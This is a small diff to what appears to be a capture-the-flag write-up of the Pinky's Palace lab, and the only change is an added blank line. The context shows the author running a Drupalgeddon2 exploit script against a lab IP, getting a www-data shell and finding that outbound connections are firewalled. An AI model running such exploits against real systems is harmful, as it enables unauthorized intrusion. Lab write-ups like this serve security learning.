@@ -120,6 +120,7 @@ root@kali:~/panther/Drupalgeddon2# ruby drupalgeddon2.rb http://192.168.0.74:800
 pinkys-palace>> id  
 uid=33(www-data) gid=33(www-data) groups=33(www-data)  
 ```  
+
 www-data  
 --------- 
 After some basic enumeration, I tried to grab some files from my local box using the shell.  For some reason however, I couldn't get a connection.  A quick gander at the firewall rules reveals that outbound connections are blocked.
